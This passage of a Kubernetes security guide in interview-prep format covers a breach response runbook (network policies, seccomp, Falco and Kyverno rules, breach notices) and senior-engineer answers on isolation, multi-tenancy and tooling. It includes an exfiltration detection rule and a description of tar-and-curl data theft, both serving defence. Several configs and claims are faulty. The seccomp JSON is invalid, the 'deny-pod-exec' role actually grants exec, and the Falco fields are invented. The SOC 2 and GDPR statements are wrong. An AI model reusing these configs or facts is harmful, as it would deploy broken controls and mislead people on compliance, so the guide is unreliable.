echo "=== Fixing image vulnerability ==="
git switch -c security/libxml2-xxe-patch
# Update Dockerfile: RUN apt-get update && apt-get install libxml2=<patched-version>
docker build -t payment-processor:$(git rev-parse --short HEAD) .
trivy image --severity CRITICAL payment-processor:$(git rev-parse --short HEAD)
# Verify no critical CVEs

# 2. Deploy strict Network Policy
kubectl apply -f - <<'EOF'
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: payment-processor-egress-control
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: payment-processor
  policyTypes:
  - Egress
  egress:
  # Allow: DNS
  - to:
    - namespaceSelector:
        matchLabels:
          name: kube-system
    ports:
    - protocol: UDP
      port: 53
  # Allow: Database only
  - to:
    - podSelector:
        matchLabels:
          app: postgres
    ports:
    - protocol: TCP
      port: 5432
  # Allow: Config service only
  - to:
    - podSelector:
        matchLabels:
          app: config-service
    ports:
    - protocol: TCP
      port: 8080
  # DENY: All other outbound
EOF

# 3. Deploy seccomp profile blocking data exfiltration syscalls
cat > /var/lib/kubelet/seccomp/payment-processor.json <<'EOF'
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "defaultErrnoRet": 1,
  "syscalls": [
    {
      "names": ["sendfile", "sendfile64", "sendmsg", "send"],
      "action": "SCMP_ACT_LOG"  # Alert on large data transmission attempts
    }
  ]
}
EOF

kubectl patch pod payment-processor \
  -p '{"spec":{"securityContext":{"seccompProfile":{"type":"Localhost","localhostProfile":"payment-processor.json"}}}}'

# 4. Enforce DLP (Data Loss Prevention) at egress
cat > dataloss-prevention-policy.yaml <<'EOF'
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: prevent-pii-egress
spec:
  validationFailureAction: audit
  rules:
  - name: detect-pii-in-processes
    match:
      resources:
        kinds:
        - Pod
        labels:
          handles-pii: "true"
    validate:
      message: "Pods handling PII must not exfiltrate data"
      # Implementation depends on DLP solution (e.g., Forcepoint, Symantec)
      # General approach: Monitor file access, network writes for PII patterns
EOF

# 5. Enable pod runtime security scanning
kubectl apply -f - <<'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: falco-custom-rules
  namespace: falco
data:
  data_exfiltration.yaml: |
    - rule: Detect Data Exfiltration
      desc: Detect large data transfer from pods handling PII
      condition: >
        container and
        (
          (write_to_network and data_bytes > 100MB and outbound_connection) or
          (process_name = "tar" and parent_process_name = "bash") or
          (process_name = "zip" and large_output)
        )
      output: >
        Potential data exfiltration detected
        (container:%container.name user:%user.name command:%proc.cmdline)
      priority: CRITICAL
      tags: [data_exfiltration, pii]
EOF

# 6. Implement RBAC to prevent kubectl exec
kubectl apply -f - <<'EOF'
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: deny-pod-exec
rules:
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]
  # Effectively deny (by not granting to anyone)
EOF

echo "✓ Prevention controls implemented"
```

**Phase 4: Compliance & Notification (post-incident)**

```bash
#!/bin/bash
# Fulfill regulatory and notification requirements

echo "=== Phase 4: Compliance ==="

# 1. Generate incident report (required by GDPR, CCPA, HIPAA within 72 hours)
cat > /incident-reports/breach-2024-03-22.md <<'EOF'
# Security Breach Incident Report

**Date Discovered**: 2024-03-22 11:00 UTC  
**Date Disclosed**: 2024-03-22 11:30 UTC (to management/legal)  
**Data Affected**: Transaction logs containing customer PII (credit cards, names, addresses)  
**Records Affected**: ~50,000 customers  
**Severity**: CRITICAL  

## Attack Summary
- **Vector**: XXE vulnerability in payment-processor application
- **Initial Access**: Remote Code Execution via XML upload
- **Lateral Movement**: None (isolated pod)
- **Data Loss**: 500MB transaction logs exfiltrated
- **Timeline**: ~3 hours between compromise and detection

## Forensics Findings
- Attacker accessed pod via XXE RCE
- Attacker executed shell commands to locate data
- Attacker used tar + curl to exfiltrate data
- No evidence of privilege escalation or host compromise
- Exfiltration stopped at network policy enforcement

## Remediation
- Image patched with updated libxml2 (CVE-2024-XXXXX)
- Strict egress network policy deployed
- Seccomp profile added
- DLP monitoring enabled
- Runtime threat detection tuned
- Incident documented for compliance

## Notification Requirements

- GDPR: 72 hours to notify individuals
  Timeline: Notify on 2024-03-25
  
- CCPA: "Without unreasonable delay" (typically 30 days)
  Timeline: Notify by 2024-04-22
  
- Payment Card Industry: Immediate notification to acquiring bank
  Timing: 2024-03-22 14:00 UTC
  
## Post-Incident Actions
1. ✓ Forensics collected and preserved
2. ✓ Vulnerability patched
3. ✓ Security controls improved
4. ✓ Incident post-mortem scheduled
5. ⏳ Legal/compliance notification in progress
6. ⏳ Affected customer notifications in progress
EOF

echo "✓ Incident report generated"

# 2. Notification to affected customers (required by law)
cat > /customer-notifications/breach-notice.txt <<'EOF'
Dear Valued Customer,

We are writing to inform you of a security incident affecting your payment information.

On March 22, 2024, we detected unauthorized access to our payment processing system. 
An attacker exploited a known vulnerability to access transaction logs containing:
- Your name
- Payment card information (last 4 digits)
- Transaction history
- Shipping address

We have taken the following actions:
1. Immediately isolated the affected system
2. Patched the vulnerability
3. Enhanced security monitoring
4. Notified law enforcement and regulatory bodies

Recommended actions for you:
1. Monitor your credit card statements for unauthorized charges
2. Consider placing a fraud alert with credit bureaus
3. Our identity protection partner is offering 2 years of credit monitoring at no cost

For questions, contact our security team: security@company.com

Sincerely,
[Company] Security Team
EOF

echo "✓ Customer notification template prepared"
```

**Best Practices Demonstrated**

1. **Immediate containment** (stop attack in progress)
2. **Forensics-first approach** (preserve evidence before deletion)
3. **Multi-layer investigation** (understand attack, not just symptoms)
4. **Prevention through defense-in-depth** (network + seccomp + DLP + RBAC)
5. **Compliance awareness** (timely notification fulfills legal requirements)

**Metrics**

- Response time: 5 minutes to containment
- Forensics collection: 30 minutes
- Investigation: 45 minutes
- Prevention implementation: 1+ hours
- Total time-to-prevention: 1.5-2 hours
- Compliance timeline: Notifications sent within 24 hours (well ahead of 72-hour GDPR deadline)

---

## Most Asked Interview Questions

### Question 1: Container Isolation vs. VM Security Trade-offs

**Question**

"Our organization traditionally deployed applications in VMs for security isolation. We're shifting to Kubernetes and containers. How would you explain to the CTO that containers are secure despite sharing the kernel? What are the actual security boundaries, and when should we recommend VMs over containers?"

**Expected Senior Engineer Answer**

Containers and VMs represent different isolation models with trade-offs:

**VM Model**:
- Hardware-level isolation: Separate kernels, hypervisor enforces boundaries
- Vulnerability scope: Hypervisor exploit affects one VM, others unaffected
- Operational overhead: Slower boot, larger resource consumption, slower updates
- Best for: Multi-tenant hosting, untrusted workloads, legacy compliance requirements

**Container Model**:
- Kernel-level isolation: Shared kernel, namespaces provide process separation
- Vulnerability scope: Kernel exploit affects all containers (BUT: smaller trusted base due to minimal images)
- Operational benefit: Faster deployment, efficient resource usage, rapid patching
- Best for: Homogeneous workloads, zero-trust architecture, DevOps velocity

**Security Reality** (the nuance):

Containers achieve security through **layers**, not single isolation:
```
Layer 1: Minimal images (Ubuntu 80MB → Alpine 7MB)
         Less code = fewer bugs = smaller attack surface
         
Layer 2: Namespace isolation (PID, network, mount)
         Prevents cross-container visibility
         NOT cryptographic isolation
         
Layer 3: Seccomp + capabilities (500+ syscalls → 30 whitelisted)
         Most privilege escalation vectors blocked
         
Layer 4: Runtime monitoring (Falco/eBPF)
         Detect if Layers 1-3 compromised
         
Layer 5: Network policies (zero-trust microsegmentation)
         Limit lateral movement damage
```

**Key Insight**: A single kernel exploit bypasses Layers 1-3, BUT:
- Kernel exploits are rare (Linux kernel hardened for 30 years)
- Layer 4-5 (runtime + network) still contain blast radius
- Recovery is fast (rolling pod replacement in seconds)

**Recommendation**: 
- **Use containers for**: Web services, microservices, managed platforms (AKS, GKE)
- **Use VMs for**: Untrusted third-party code, legacy compliance (SOC 2 Type II requires VM-level isolation), heterogeneous workloads

**Real-world analogy**: 
Containers are like locking office doors (security through process separation), not bank vaults (hardware separation). Adequate for typical threats, not for adversarial multi-tenancy.

---

### Question 2: Designing Security Architecture for Multi-Tenant SaaS

**Question**

"Design a Kubernetes security architecture for a B2B SaaS platform serving competing enterprises. Customers must not see each other's data or infrastructure. You have a shared cluster cost budget. What controls would you implement, and in what order? Where do you trade off security for cost?"

**Expected Senior Engineer Answer**

**Architecture Decision Tree**:

```
Decision: Single cluster vs. multiple clusters?
├─ Multiple clusters per customer: Most secure, most expensive, rarely justified
├─ Single cluster, dedicated namespaces: Good security/cost balance, standard practice
└─ Multiple clusters, shared services: Hybrid (control plane isolated, workloads shared)

For SaaS: Single cluster + namespace-per-customer
```

**Security Layers** (in implementation order):

**1. Namespace Isolation (Foundation)**
```yaml
# Namespace per customer with labels
Namespace: customer-acme
Namespace: customer-globex
Namespace: customer-initech

Isolation principle: 
- RBAC ensures customer-acme DevOps can't list customer-globex resources
- Namespaces are the "blast radius boundary" (compromise affects one customer only)
```

**2. Network Policies** (Prevent lateral movement)
```
Default-deny egress from customer namespaces
Except: → DNS, → external APIs, → shared logging (one-way)

Effect: If customer-acme compromised, attacker cannot reach customer-globex pods
Trade-off: Application developers need explicit network policies (operational burden)
```

**3. RBAC** (Control API access)
```yaml
customer-acme DevOps team:
- Can: list/create/update deployments in namespace customer-acme
- Cannot: view secrets in other namespaces
- Cannot: delete namespaces

Shared services (logging, monitoring):
- Service account: limited to read-only metrics/logs
- Cannot: modify workloads
```

**4. Pod Security Standards** (Container constraints)
```yaml
All namespaces: pod-security.kubernetes.io/enforce: restricted
- runAsNonRoot: true
- allowPrivilegeEscalation: false
- readOnlyRootFilesystem: true
- Capabilities: drop ALL

Effect: Even if pod compromised, attacker can't achieve root or modify system
```

**5. Resource Quotas** (Noisy neighbor prevention)
```yaml
Per customer namespace:
  requests:
    cpu: 10
    memory: 20Gi
  limits:
    cpu: 20
    memory: 40Gi

Effect: If customer-acme runs cryptominer, uses max 20 CPUs (not entire cluster)
Trade-off: Requires upfront capacity planning
```

**6. Network Segmentation** (Optional but recommended)
```
Customer pods on unique nodes or node pools
OR
Node affinity rules ensuring customer-acme pods on acme-node-pool

Effect: Physical isolation supplements logical isolation
Trade-off: Cost (under-utilized nodes if customer has low traffic)
```

**7. Image Security** (Supply chain)
```yaml
Admission controller blocks images unless:
- From approved registry (company-controlled)
- Signed by company security team
- Pass vulnerability scan (no CRITICAL CVEs)

Effect: Prevents customer-acme from deploying malware affecting other customers
```

**8. Audit Logging** (Compliance)
```yaml
All API calls logged to central logging system (customer-acme cannot modify logs)
Logs include:
- Which customer accessed what resource
- When
- From which IP
- Success/failure

Effect: Forensics if customer claims someone else accessed their data
```

**Security vs. Cost Trade-offs**:

| Control | Security | Cost | When to implement |
|---------|----------|------|-------------------|
| Namespace isolation | HIGH | $0 (built-in) | Always |
| Network policies | HIGH | $200/mo ops overhead | Always |
| RBAC granularity | MEDIUM | $100/mo ops overhead | Always |
| Pod Security Standards | HIGH | $0 (built-in) | Always |
| Resource quotas | MEDIUM | $0 | Always |
| Node segregation | LOW | $5k/mo extra nodes | Only if customer-acme is tier-1 account |
| Image signing | MEDIUM | $300/mo CI/CD integration | If compliance requires |
| Audit logging | MEDIUM | $1k/mo logging infrastructure | Required for compliance |

**Deployment Strategy**:
- **Phase 1 (Week 1)**: Namespaces + RBAC + Pod Security Standards (high security, $0 cost)
- **Phase 2 (Week 2)**: Network policies (high security, moderate ops overhead)
- **Phase 3 (Month 2)**: Resource quotas, audit logging (medium security, moderate cost)
- **Phase 4 (Optional)**: Node segregation for high-value customers (premium tier)

**Real-world Example**: AWS EKS multi-tenant design follows this pattern exactly.

---

### Question 3: Incident Response - Container Compromise Detection

**Question**

"Your monitoring detects unusual network traffic from payment-processor pods: 5 GBps to 192.0.2.50 (unknown external IP). Your team suspects data exfiltration. You have 2 minutes to decide: (1) Kill all payment-processor pods immediately, (2) Isolate ports but keep pods running for forensics, (3) Do nothing while investigating. What's your decision and why?"

**Expected Senior Engineer Answer**

**Immediate Decision**: Option 2 - Isolate ports but preserve pods for forensics.

**Reasoning**:

```
Option 1 risks (Kill pods):
✗ May destroy evidence (shell history, attacker tools, running processes)
✗ Slower incident response (can't analyze what happened)
✗ Compliance risk (may require forensics within 4 hours for regulations)
✓ Fast containment (stops data exfiltration immediately)

Option 2 benefits (Isolate + forensics):
✓ Stops data exfiltration (network policy blocks port)
✓ Preserves forensic evidence (pod still running)
✓ Enables root cause analysis (why was vulnerability exploited?)
✓ Allows forensic tools to run BEFORE pod deletion
✗ Takes 5 minutes vs. immediate kill

Option 3 risks (Do nothing):
✗ Exfiltration continues for hours
✗ Data loss grows exponentially
✗ Customer breach and notification requirements tier
```

**My 2-minute action** (no discussion, execute):

```
00:00 - Alert received
00:15 - Deploy network policy:
  NetworkPolicy blocks payment-processor egress except to DNS, database, logging
  (Existing "default-deny" would block, so attach new policy with just >DATABASE access)

00:30 - Verify port closed:
  Packet loss confirms 192.0.2.50 unreachable
  Data exfiltration stopped

01:00 - Forensic collection (preservation):
  - Capture container filesystem (/var → /forensics)
  - Extract shell history (who ran what commands)
  - Capture running processes (what is attacker's toolkit)
  - Capture network connections (where else did attacker connect)
  - Capture environment variables (how did attacker get credentials)

02:00 - Root cause investigation:
  - Identify vulnerability exploited (XXE, injection, deserialization?)
  - Determine if this is 0-day or known CVE
  - Check image scan logs (why wasn't this caught?)

03:00 - Incident classification:
  If single pod compromised: Rotate credentials, re-deploy pod with patched image
  If multiple pods: Broader investigation needed
  If host compromised: Drain node, investigate kubelet access
```

**Post-Incident (hours 4-24)**:

```
1. Investigation findings documented
2. Vulnerability confirmed (likely XXE in payment-processor XML parser)
3. Image rebuilt with:
   - CVE patched (libxml2 updated)
   - Additional security controls (seccomp profile)
4. Security audit of other microservices using same library
5. Runbook updated for faster response next time
```

**Key Principle**:
In incident response, **preserve forensic capability > immediate damage control**. Modern infrastructure can be rapidly re-deployed (pods replaced in seconds), but forensics are a one-time opportunity. Understanding the attack enables prevention.

**Exception**: If exfiltration is transferring customer PII in real-time on live stream, the urgency changes (kill pods immediately). But for batch transfers (logs already copied), forensics preservation is better.

---

### Question 4: Troubleshooting Network Policy Accidentally Breaking Production

**Question**

"You deployed a network policy Friday 5pm to isolate microservices. By Saturday 2am, payment processing completely breaks. 1000s of errors, customers complaining. Your policy looks correct on paper. How would you troubleshoot, and what's your rollback strategy?"

**Expected Senior Engineer Answer**

**Immediate Response** (preserve sleep, move fast):

1. **Verify network policy is the cause** (not other change):
   ```bash
   # List all NetworkPolicies created in last 24 hours
   kubectl get networkpolicies -A -o json | jq '.items[] | select(.metadata.creationTimestamp > "2024-03-21T17:00:00Z")'
   
   # If policy exists, delete it
   kubectl delete networkpolicy <policy-name> -n <namespace>
   
   # Verify traffic restored
   sleep 10
   kubectl top pods -n production | grep payment
   # If CPU drops back to normal = network policy was culprit
   ```

2. **If traffic restored after deleting policy**:
   - Incident severity drops from critical to triage
   - Communicate to team: "Issue isolated, investigating solution"
   - Sleep can wait 15 minutes, knowing service is restored

**Root Cause Analysis** (next morning):

```bash
# Step 1: What traffic is actually happening?
# Use Cilium Hubble (if installed) to trace actual pod-to-pod traffic

kubectl exec -n cilium-system hubble-relay-pod -- \
  hubble observe --pod-labels --output=json | \
  jq -r '.[] | "\(.source.pod) → \(.destination.pod) on \(.destination.port)"' | \
  sort | uniq

# Expected connections (example):
# payment-processor-xyz → postgres-primary on 5432
# payment-processor-xyz → config-service on 8080
# payment-processor-xyz → auth-service on 9000

# Step 2: Compare to policy definition
# If policy allows traffic to "config-service" on port 8080
# But flow shows payment tries port 8081,
# → Policy is too strict (wrong port number)

# Step 3: Check for DNS issues
# If policy blocks DNS (port 53), all service lookups fail
kubectl get networkpolicy -o yaml | grep -A10 "port: 53"
# If missing DNS egress rule, add it

# Step 4: Check for cross-namespace traffic
# If payment-processor (namespace A) needs config-service (namespace B),
# policy must allow cross-namespace (not just pod labeled)
kubectl get networkpolicy -o yaml | grep -B5 "namespaceSelector"
```

**Common Mistakes** (in order of frequency):

1. **Missing DNS** (Most common):
   ```yaml
   # ❌ Bad: Blocks all egress except to specific pods
   spec:
     podSelector: {}
     egress:
     - to:
       - podSelector:
           matchLabels: app=myservice
   
   # Problem: No DNS access, service names can't resolve
   
   # ✓ Good: Include DNS
   spec:
     egress:
     - to:
       - namespaceSelector: {}
       ports:
       - protocol: UDP
         port: 53  # Add this
     - to:
       - podSelector:
           matchLabels: app=myservice
   ```

2. **Wrong port**:
   ```yaml
   # ❌ Bad: Policy allows port 8080, app actually listens on 8081
   - to:
     - podSelector:
         matchLabels: app=config
     ports:
     - protocol: TCP
       port: 8080  # Wrong
   
   # ✓ Good: Check actual listening port
   kubectl exec config-service-pod -- netstat -tupn | grep LISTEN
   # Output: tcp 0 0 0.0.0.0:8081
   # Fix port to 8081
   ```

3. **Cross-namespace traffic blocked**:
   ```yaml
   # ❌ Bad: Assumes all pods are in same namespace
   - to:
     - podSelector:
         matchLabels: app=database
   
   # Problem: If database is in "data" namespace and app is in "default",
   # podSelector doesn't match across namespaces
   
   # ✓ Good: Include namespace selector
   - to:
     - namespaceSelector:
         matchLabels: name=data
       podSelector:
         matchLabels: app=database
   ```

4. **Default-deny too aggressive**:
   ```yaml
   # ❌ Bad: Default deny INGRESS + EGRESS + no allow rules
   spec:
     podSelector: {}
     policyTypes:
     - Ingress
     - Egress
     egress: []  # BLOCK EVERYTHING
   
   # Result: No outbound traffic at all
   
   # ✓ Good: Start with just ingress deny, add egress rules gradually
   spec:
     policyTypes:
     - Ingress
     ingress: []  # Deny ingress
     # Egress not specified = allow by default
   ```

**Prevention Strategy** (for the runbook):

```
Before deploying network policies:

1. Profile actual traffic:
   - Deploy permissive policy (logging only)
   - Run for 24 hours in staging
   - Collect all pod-to-pod connections
   - Document in runbook

2. Test in non-prod first:
   - Deploy policy to dev/staging
   - Verify all apps work for 2+ hours
   - Monitor alert channels (no connectivity errors)

3. Gradual rollout:
   - Deploy policy in audit mode (doesn't block, just alerts)
   - Monitor for violations for 24 hours
   - If violations, adjust policy instead of enabling block mode

4. Runbook for quick disable:
   - Script: delete all newly created policies in one command
   - Include in on-call playbook
   - Test quarterly to ensure it works
```

---

### Question 5: Evaluating Third-Party Container Security Tools

**Question**

"Your organization is evaluating container security solutions. You have budget for only one comprehensive tool. You're weighing Trivy (image scanning), Falco (runtime monitoring), and OPA/Kyverno (admission control). Which single tool would you choose, and what do you give up?"

**Expected Senior Engineer Answer**

**The Honest Answer**: "You actually need all three, not just one. But if forced to choose only one for maximum security bang-for-buck, I'd choose **Falco (runtime monitoring)** with caveats."

**Why Falco is the best single choice**:

```
Threat coverage (what it catches):
- Image vulnerabilities: ❌ (But assumes image scanning happens elsewhere in CI/CD)
- Runtime exploits: ✓ (Catch privilege escalation, container escape)
- Lateral movement: ✓ (Detect suspicious network connections)
- Data exfiltration: ✓ (Large data transfers, unusual protocols)
- Supply chain attacks: Partial ✓ (Can detect malicious app behavior post-deployment)

The reasoning:
- Image scanning (Trivy) is fast, cheap, and should be part of CI/CD before deployment
- Admission control (Kyverno) prevents worst misconfigurations but won't stop 0-day exploits
- Runtime monitoring (Falco) catches things that slip through both previous layers
  (This is "trust but verify" approach - assume some bad containers will deploy)
```

**Why this is still incomplete**:

```
❌ Without Trivy:
- You deploy containers with known CVEs "accidentally"
- Run time detection catches exploits, but prevention is better than detection
- Dependency issues go unnoticed until actively exploited

❌ Without Kyverno:
- Admins accidentally deploy privileged pods
- Policy violations only discovered at runtime (not at deploy time)
- Compliance requirements harder to enforce

⚠️ With only Falco:
- You're betting on alert response time (must investigate in minutes)
- False positives lead to alert fatigue (security team ignores alerts)
- Reactive, not proactive
```

**Realistic Recommendation** (if I had the actual budget conversations):

```
Tier 1 (mandatory, ~$0/month):
- Trivy integration in CI/CD (open source)
- NetworkPolicy default-deny (built-in Kubernetes)
- Pod Security Standards (built-in Kubernetes 1.25+)
- audit-level logging (built-in Kubernetes)
Total: $0 license, ~$500/mo ops

Tier 2 (add if you have resources, ~$5k/mo):
- Falco for runtime monitoring (~$3k/mo)
- Cilium CNI for network segmentation (~$1k/mo)
- Kyverno for policy enforcement (~$1k/mo)

Tier 3 (if compliance requires, ~$20k+/mo):
- Commercial security scanning (Aqua, Twistlock, Snyk)
- SIEM integration (Splunk/ELK) for forensics
- Commercial endpoint detection (Crowdstrike on nodes)
```

**If I really must choose ONE tool** (hypothetical budget emergency):

```
I'd choose Falco, but with this constraint: 
- CI/CD must have Trivy scanning (even if not purchased, enforce open source version)
- Kubernetes must have default-deny NetworkPolicy (enforced via webhook)

Without these, Falco alone is like having smoke detectors but no fire extinguishers.

My pitch to management:
"Falco catches active attacks. Trivy + NetworkPolicy prevent most attacks from happening. 
We need all three, but if forced to buy only one tool, buy Falco as insurance. The other two 
are operational practices, not tools."
```

**Red Flags** (tool evaluation anti-patterns):

1. **Vendor says "We replace Kubernetes security"**: Lie. They complement, not replace.
2. **Tool claims "99% CVE detection"**: Incomplete. Detects known CVEs, misses 0-days and logic bugs.
3. **Dashboard with 1000+ alerts/hour**: Unusable. Tool tuning is as important as tool selection.
4. **Can't integrate with existing SIEM**: Red flag. You'll need custom logging infrastructure.
5. **Requires privileged mode across cluster**: Huge red flag. Falco doesn't need privileged pods on workers.

---

### Question 6: Container Base Image Strategy Trade-offs

**Question**

"Your organization runs 500+ microservices. We currently use Ubuntu 22.04 as base image (77MB, ~1500 packages). Security team wants us to switch to Alpine (7MB, ~50 packages) for smaller CVE surface. Operations is concerned about compatibility issues (missing libc modules, shell differences). How do you make this decision, and what's your migration strategy?"

**Expected Senior Engineer Answer**

**Analysis Framework**:

| Aspect | Ubuntu 22.04 | Alpine 3.18 | Distroless | Scratch |
|--------|-------------|------------|-----------|---------|
| Size | 77MB | 7MB | 5MB | 0B |
| Packages | ~1500 | ~50 | 0 | N/A |
| CVE Surface | Large | Small | Minimal | Minimal |
| Libc | glibc | musl | glibc | N/A |
| Shell | bash | sh | None | None |
| Compatibility | 99% | 95% | 60% | 10% |
| Update Speed | Weekly | Monthly | Weekly | N/A |
| Build Complexity | Low | Low | Medium | High |
| Debugging | Easy (full bash) | Hard (limited tools) | Hard (no binaries) | Impossible |

**My Recommendation**: Stratified approach, not one-size-fits-all.

```
Category 1 (30% of services): Simple web/API services (Golang, Java compiled binaries)
→ Use Distroless or Scratch
   Reasoning: Compiled binary needs only runtime env, no shell tools, minimal CVE surface
   Example: Go service → scratch → 15MB final image (vs. 100MB with Ubuntu)
   
Category 2 (50% of services): Python/Node.js services with standard libraries
→ Use Alpine 3.18
   Reasoning: Python/Node.js packages mostly Alpine-compatible, significant size savings
   Caveat: Test thoroughly - some packages fail on musl (not glibc)
   Mitigation: Automated testing in CI/CD to catch Alpine incompatibilities
   
Category 3 (15% of services): Services with unusual dependencies (rare system libraries)
→ Use minimal Ubuntu or UBI-8
   Reasoning: Guaranteed glibc compatibility, not worth forcing Alpine
   Trade-off: Accept larger images for proven compatibility
   
Category 4 (5% of services): Legacy systems needing extensive debugging
→ Use Ubuntu 22.04 as-is
   Reasoning: Full shell, all tools available, necessary for operations team
   Timeline: Plan migration as services are rewritten
```

**Migration Strategy**:

**Phase 1 (Month 1)**: Pilot (low-risk services)
```
1. Select 5 simple Go services
2. Rebuild 2 with distroless, 2 with Alpine, keep 1 as control
3. Deploy to staging, run for 2 weeks
4. Monitor: Performance, memory usage, startup time
5. Compare CVE scan results (should be dramatically fewer)
6. Document findings, create guidance
```

**Phase 2 (Month 2-3)**: Python/Node services
```
1. Standardize Python packages to Alpine-compatible versions
   (py3-requests instead of requests, update requirements.txt)
2. Create Alpine Python base image (pre-tested, documented)
3. Migrate 20 Python services, document issues
4. Update CI/CD to automatically test Alpine compatibility
5. Create runbook for "Alpine package not available" troubleshooting
```

**Phase 3 (Month 4+)**: Java services
```
Java Alpine is tricky (memory management, compilation).
1. Use Eclipse Temurin Alpine base image (optimized for Java)
2. Significant space savings: 900MB JVM → 200MB with Alpine
3. Test extensively before production rollout
```

**Operational Impact** (what we gain/lose):

```
✓ Gains:
- CVE surface reduced by 90% (500 packages → 50)
- Faster image download/deployment (15MB Alpine vs. 77MB Ubuntu)
- Faster registry scanning (fewer packages to check)
- Faster incident response (rolling updates faster)

✗ Losses:
- Developers can't use 'apt-get install' for debugging
  (Can't install tcpdump, netstat, etc. in running container)
  Mitigation: Provide debug containers (same image + debugging tools) deployed on-demand
  
- Some npm/pip packages fail on Alpine (musl vs. glibc incompatibility)
  Mitigation: Automated testing, maintain compatibility list
  
- Reduced environment similarities (dev on Linux, prod on Alpine)
  Mitigation: Developers must test Alpine locally
```

**The Real Conversation** (with teams):

```
To Developers:
"Alpine images are smaller and more secure, reducing risk. Some packages may need 
compatibility fixes. We'll provide Alpine base images and automated testing."

To Operations:
"Alpine requires different debugging approach (can't apt-get install tools). 
We're providing debug container sidecar injection on-demand."

To Security:
"This reduces vulnerability surface by ~90%. CVE response time improves because 
fewer packages to patch."

To Compliance:
"Smaller attack surface helps with SOC 2 compliance (demonstrates security controls)."
```

**Key Success Metric**: 
Not "how many services use Alpine" but "average CVE exposure per container".
Target: Reduce from ~50 medium/high CVEs per container to ~5.

---

### Question 7: Capacity Planning with Security Overhead

**Question**

"You're planning Kubernetes infrastructure for 1000 microservices. Initial estimate: 100 nodes. Then you factor in security controls (Falco DaemonSet on every node, Istio service mesh, admission control webhooks). How much overhead do these add? Should you increase node count?"

**Expected Senior Engineer Answer**

**Honest Assessment**: It depends, but typically 15-30% overhead.

**Breakdown of Security Tool Overhead**:

```
Base Kuberenetes overhead (kube-proxy, kubelet, cgroup cleanup):
~1 CPU core, ~500MB memory per node
(Already accounted for in your 100-node estimate)

Additional security overhead:

1. Falco Runtime Monitoring
   Per node: ~200-500 MB memory (depending on alert volume)
   Per node: ~0.1-0.3 CPU (eBPF tracing, event processing)
   Total: ~100 nodes × 0.3 CPU = 30 CPUs (equivalent to ~4 nodes)
   
2. Istio Service Mesh (if deployed)
   Control plane (istiod): ~2 CPUs, ~2GB memory (shared across cluster)
   Per pod sidecar (Envoy proxy): ~50MB memory, ~0.05 CPU per pod
   1000 microservices × 0.05 CPU = 50 CPUs (equivalent to ~8 nodes)
   
3. Admission Control Webhooks (OPA/Kyverno)
   Baseline: ~1 CPU, ~1GB memory
   Scale: ~0.001 CPU per API call
   At 1000 requests/minute cluster-wide: ~0.02 CPU sustained
   
4. Extra Logging/Monitoring for Security
   Falco alerts, security events: ~200MB memory, ~0.1 CPU per node
   
5. CNI network plugin with enhanced security (Cilium vs. Flannel)
   Cilium: ~100MB memory, ~0.1 CPU per node vs. Flannel ~20MB, ~0.05 CPU
   Delta: ~80MB, ~0.05 CPU per node = negligible
```

**Total Overhead Calculation**:

```
Falco: ~30 CPUs (3 nodes)
Istio: ~50 CPUs (8 nodes) ← Biggest impact if deployed
OPA/Kyverno: ~1 CPU (negligible)
Logging overhead: ~10 CPUs (1.5 nodes)

Total: ~91 CPUs (14 nodes) for security

Original estimate: 100 nodes
New estimate: 100 + 15 = 115 nodes (15% overhead)

BUT: This assumes you deploy ALL security tools simultaneously.
Reality: Phased rollout over months
```

**My Recommendation** (phased approach):

```
Phase 1 (Month 1): Essential controls (~5% overhead)
- Falco (required for incident response)
- NetworkPolicy CNI (Cilium) (required for segmentation)
- OPA/Kyverno (policy enforcement)
Overhead: ~10 nodes
New estimate: 110 nodes

Phase 2 (Month 3): Add observability (~3% overhead)
- Prometheus for security metrics
- Centralized audit log shipping
Overhead: ~3 nodes
New estimate: 113 nodes

Phase 3 (Month 6): Add service mesh (IF needed, ~8% overhead)
- Istio (mTLS + authorization policies)
- This is optional - depends on zero-trust requirements
Overhead: ~8 nodes
New estimate: 121 nodes

Do you actually need service mesh? Question back:
- Requirement: All service-to-service traffic must be encrypted?
  Yes → Istio required (adds 8 nodes)
  No → NetworkPolicy + TLS at app layer sufficient (save 8 nodes)
```

**Cost-Benefit Analysis**:

```
Scenario A: 100 nodes + no security tools
Cost: $100k/month (assuming $1k/node/month)
Security: Basic (RBAC + NetworkPolicy only)
Risk: High (no runtime monitoring, no admission control)

Scenario B: 115 nodes + full security stack (Falco + OPA + Cilium)
Cost: $115k/month
Security: High (detection + prevention + segmentation)
Risk: Medium (still need incident response runbooks)

Scenario C: 121 nodes + security stack + Istio
Cost: $121k/month
Security: Very High (added mTLS + service-level authorization)
Risk: Low

Audit/Compliance cost if breached: $500k - $5M depending on data loss
Conclusion: $15-21k/month insurance premium justified if you handle PII/payment cards
```

**My Advice to management**:

```
"Security tools add 15-30% infrastructure cost ($15-30k/month in this case).
This is an insurance premium. If you handle sensitive data, it's worth it.
If you host open-source libraries with no PII, maybe reconsider.

Phase the rollout:
- Start with Falco + NetworkPolicy ($5k/month overhead)
- Add Kyverno for compliance enforcement ($2k/month)
- Consider Istio only if zero-trust is a requirement ($8k/month)

Don't deploy everything at once. Monitor; adjust based on actual usage."
```

---

### Question 8: Debugging Why Image Scanning Passed But Container Had CVE

**Question**

"A production container with a critical CVE was successfully pushed to registry and deployed. Your image scanning solution (Trivy) ran at build time and reported 0 critical vulnerabilities. Two days later, CVE-2024-XXXXX is published, affecting libssl library in your image. Now you have containers running with unpatched vulnerability. How did this happen, and how do you prevent it?"

**Expected Senior Engineer Answer**

**Root Cause Analysis** (the gotcha):

```
Trivy scan ran at 2024-03-21 15:30:00
- libssl 1.1.1 was in Trivy's CVE database as "safe"
- Image passed scan, deployed to production

CVE announced at 2024-03-23 10:00:00 (2 days later)
- CVE-2024-XXXXX discovered in libssl 1.1.1
- Trivy database updated at 2024-03-23 14:00:00

Running containers deployed 2 days ago:
- Still have old libssl 1.1.1
- Now vulnerable to new CVE (not discovered at scan time)

This is not a scanning failure—it's the nature of security (0-days exist)
```

**Why This Happens**:

```
Image Scanning Gap:
- Scanning is a point-in-time assessment ("What's vulnerable TODAY?")
